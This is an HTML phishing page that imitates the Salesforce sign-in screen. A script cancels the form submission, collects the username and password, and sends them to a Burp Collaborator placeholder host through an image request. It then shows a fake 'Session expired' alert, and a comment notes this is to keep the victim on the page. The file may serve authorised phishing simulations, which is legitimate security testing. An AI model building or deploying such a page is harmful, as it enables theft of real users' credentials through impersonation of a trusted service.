<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Sign in to Salesforce</title>
  <style>
    * { box-sizing: border-box; }
    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; padding: 2rem; min-height: 100vh; display: flex; align-items: center; justify-content: center; background: #f3f3f3; }
    .card { background: #fff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,.1); padding: 2rem; width: 100%; max-width: 400px; }
    .logo { color: #0176d3; font-weight: 700; font-size: 1.5rem; margin-bottom: 1.5rem; }
    h1 { font-size: 1.25rem; font-weight: 600; margin: 0 0 1rem; color: #181818; }
    label { display: block; font-size: 0.875rem; font-weight: 600; margin-bottom: 0.25rem; color: #3e3e3c; }
    input { width: 100%; padding: 0.5rem 0.75rem; border: 1px solid #c9c9c9; border-radius: 4px; font-size: 1rem; margin-bottom: 1rem; }
    button { width: 100%; padding: 0.6rem 1rem; background: #0176d3; color: #fff; border: 0; border-radius: 4px; font-size: 1rem; font-weight: 600; cursor: pointer; }
    button:hover { background: #014a8f; }
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">Salesforce</div>
    <h1>Sign in to your account</h1>
    <form id="login" method="get" action="#">
      <label for="username">Username or email</label>
      <input type="text" id="username" name="username" autocomplete="username" required/>
      <label for="password">Password</label>
      <input type="password" id="password" name="password" autocomplete="current-password" required/>
      <button type="submit">Log In</button>
    </form>
  </div>
  <script>
    (function () {
      var params = new URLSearchParams(window.location.search);
      var collab = params.get('collab') || 'https://YOUR-BURP-COLLAB.oastify.com';
      document.getElementById('login').addEventListener('submit', function (e) {
        e.preventDefault();
        var u = document.getElementById('username').value;
        var p = document.getElementById('password').value;
        var url = collab.replace(/^https?:\/\//, 'https://') + '/?u=' + encodeURIComponent(u) + '&p=' + encodeURIComponent(p);
        new Image().src = url;
        alert('Session expired. Please try again.'); // optional: keep victim on page
      });
    })();
  </script>
</body>
</html>
